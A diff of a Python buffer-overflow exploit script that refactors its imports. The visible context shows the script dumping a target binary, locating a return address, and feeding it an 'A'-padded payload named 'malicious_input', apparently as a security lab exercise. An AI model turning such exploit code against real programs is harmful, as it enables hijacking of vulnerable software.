@@ -1,7 +1,7 @@
 #!/usr/bin/python3
-from subprocess import call, Popen, PIPE, run
-import sys
-import os
+from subprocess import call, run, PIPE, Popen
+from sys import argv, exit
+from os import remove
 
 TMP_FILE = "/tmp/vuln_program.dump"
 
@@ -11,7 +11,7 @@ def create_obj_dump(exec_path):
 	dump_file.close()
 
 def delete_obj_dump():
-	os.remove(TMP_FILE)
+	remove(TMP_FILE)
 
 def get_target_addr():
 	cat_proc = Popen(["cat", TMP_FILE], stdout=PIPE)
@@ -47,7 +47,7 @@ def call_exec(executable, input_buff):
 	vuln_proc = run([executable], input=bytes(input_buff))
 
 def main():
-	create_obj_dump(sys.argv[1])
+	create_obj_dump(argv[1])
 	hex_input_addr = fix_target_addr(get_target_addr())
 	a_buffer = "A" * get_buffer_size()
 	delete_obj_dump()
@@ -59,7 +59,7 @@ def main():
 	malicious_input = bytearray(a_buffer, 'utf-8') + bytearray.fromhex("".join(byte_pairs))
 
 	# Call the exec passed in with malicious input
-	call_exec(sys.argv[1], malicious_input)
+	call_exec(argv[1], malicious_input)
 
 	# And we're done here!
 	return
